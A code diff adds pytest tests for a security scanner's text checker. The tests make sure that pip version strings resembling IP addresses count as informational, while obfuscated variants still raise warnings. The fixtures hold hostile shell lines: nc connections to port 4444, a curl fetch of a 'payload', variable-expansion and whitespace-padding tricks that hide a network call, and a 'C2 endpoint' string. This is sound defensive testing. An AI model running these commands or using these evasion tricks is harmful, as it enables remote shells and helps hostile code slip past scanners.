@@ -557,6 +557,118 @@ def test_text_scanner_documentation_urls_are_informational(tmp_path: Path) -> No
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
+@pytest.mark.parametrize(
+    ("filename", "command"),
+    [
+        ("README.md", "pip install opencv-python-headless==4.11.0.86"),
+        ("model_card", "pip install opencv-python-headless==4.11.0.86"),
+        ("README.md", "python -m pip install opencv-python-headless==4.11.0.86"),
+    ],
+)
+def test_text_scanner_documentation_package_version_is_not_an_ipv4_endpoint(
+    tmp_path: Path,
+    filename: str,
+    command: str,
+) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text(f"```bash\n{command}\n```\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "ipv4_address"
+        and check.details.get("ip") == "4.11.0.86"
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    ("filename", "content", "finding_type"),
+    [
+        ("README.md", "```bash\npip install https://4.11.0.86/package.whl\n```\n", "url_detected"),
+        (
+            "README.md",
+            "```bash\npip install opencv-python-headless==4.11.0.86 && echo installed\n```\n",
+            "ipv4_address",
+        ),
+        (
+            "README.md",
+            "```bash\npip install package==4.11.0.86\ncurl https://4.11.0.86/payload\n```\n",
+            "url_detected",
+        ),
+        (
+            "README.md",
+            "```bash\nIP=package==4.11.0.86 bash -c 'pip install safe-package; nc \"${IP##*==}\" 4444'\n```\n",
+            "ipv4_address",
+        ),
+        (
+            "README.md",
+            "```bash\npip install safe && target==4.11.0.86 && nc $(echo $target | cut -c2-) 4444\n```\n",
+            "ipv4_address",
+        ),
+        (
+            "README.md",
+            '```bash\npip install safe && target==4.11.0.86 && echo "$target"\n```\n',
+            "ipv4_address",
+        ),
+        (
+            "README.md",
+            "```bash\npip install target==4.11.0.86 && nc 4.11.0.86 4444\n```\n",
+            "ipv4_address",
+        ),
+        (
+            "README.md",
+            "```bash\npip install safe-package; C2 endpoint==4.11.0.86\n```\n",
+            "ipv4_address",
+        ),
+        (
+            "README.md",
+            '```bash\npip install safe-package; target=package==4.11.0.86\ncurl "${target#package==}"\n```\n',
+            "ipv4_address",
+        ),
+        (
+            "README.md",
+            "unknown_command;" + " " * (MAX_TEXT_FINDING_CONTEXT_BYTES + 32) + "pip install package==4.11.0.86\n",
+            "ipv4_address",
+        ),
+        (
+            "README.md",
+            "pip install package==4.11.0.86"
+            + " " * (MAX_TEXT_FINDING_CONTEXT_BYTES + 32)
+            + "; nc dynamic-endpoint 4444\n",
+            "ipv4_address",
+        ),
+        ("README.md", "```bash\nnpm install package==4.11.0.86\n```\n", "ipv4_address"),
+        ("README.md", "```bash\ncargo install package==4.11.0.86\n```\n", "ipv4_address"),
+        ("README.md", "```bash\ngo install package==4.11.0.86\n```\n", "ipv4_address"),
+        ("LICENSE.md", "```bash\npip install package==4.11.0.86\n```\n", "ipv4_address"),
+    ],
+)
+def test_text_scanner_documentation_package_version_near_matches_remain_actionable(
+    tmp_path: Path,
+    filename: str,
+    content: str,
+    finding_type: str,
+) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == finding_type
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 @pytest.mark.parametrize("filename", ["model_card.txt", "modelcard.md"])
 def test_text_scanner_model_card_aliases_preserve_executable_network_findings(
     tmp_path: Path,
